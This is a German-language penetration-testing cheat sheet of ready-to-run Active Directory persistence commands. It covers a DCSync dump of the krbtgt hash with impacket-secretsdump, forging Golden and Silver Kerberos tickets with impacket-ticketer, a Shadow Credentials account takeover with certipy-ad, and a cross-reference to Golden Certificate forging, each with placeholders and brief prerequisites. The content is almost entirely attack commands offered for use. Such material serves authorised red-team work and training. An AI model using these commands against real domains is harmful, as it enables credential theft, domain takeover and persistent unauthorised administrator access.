# MENU

#plateform/linux #target/remote #cat/PERSIST

% p-persist, boris, dcsync, secretsdump, impacket, krbtgt, justdcuser, drsuapi
## [PERS-a] DCSync - gezielt krbtgt-Hash ziehen (fuer Golden Ticket)
Braucht DCSync-Rechte (DA / GetChanges). -just-dc-user auch fuer beliebigen User. Ganze Domain: tippe creds.
```
impacket-secretsdump -just-dc-user 'krbtgt' '<domain>/<user>:<password>@<dc_fqdn>'
```

% p-persist, boris, goldenticket, ticketer, impacket, krbtgt, forge, tgt
## [PERS-b] Golden Ticket - impacket-ticketer (braucht krbtgt-Hash + domain-SID)
domain_sid = Domain-SID ohne RID. Ergebnis: administrator.ccache -> export KRB5CCNAME + -k nutzen (tippe lateral).
```
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> administrator
```

% p-persist, boris, silverticket, ticketer, impacket, servicehash, spn
## [PERS-c] Silver Ticket - gezielt auf einen Dienst (Service-/Machine-Hash)
service_hash = NT-Hash des Computer-/Dienstkontos. -spn z.B. cifs/<target_fqdn>.
```
impacket-ticketer -nthash <service_hash> -domain-sid <domain_sid> -domain <domain> -spn cifs/<target_fqdn> administrator
```

% p-persist, boris, shadowcredentials, certipy, keycredentiallink, msds, takeover
## [PERS-d] Shadow Credentials - certipy-ad shadow auto (braucht GenericWrite aufs Ziel)
Setzt msDS-KeyCredentialLink -> liefert NT-Hash + TGT des Ziel-Kontos. target_sam = Ziel (User/Computer$).
```
certipy-ad shadow auto -account <target_sam> -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>
```

% p-persist, boris, goldencert, certipy, ca, forge, crossref
## [PERS-e] Golden Certificate - CA-Key -> beliebige Certs offline forgen (Cross-Ref)
Kein neuer Befehl: die CA-Backup+Forge-Kette liegt auf der adcs-Seite (ADCS-GC-a/b). Tippe adcs. Dauerhafte DA-Persistence bis CA-Renewal.
```
echo 'Golden Certificate = CA-Key sichern + offline forgen (ADCS-GC-a/b)'
```
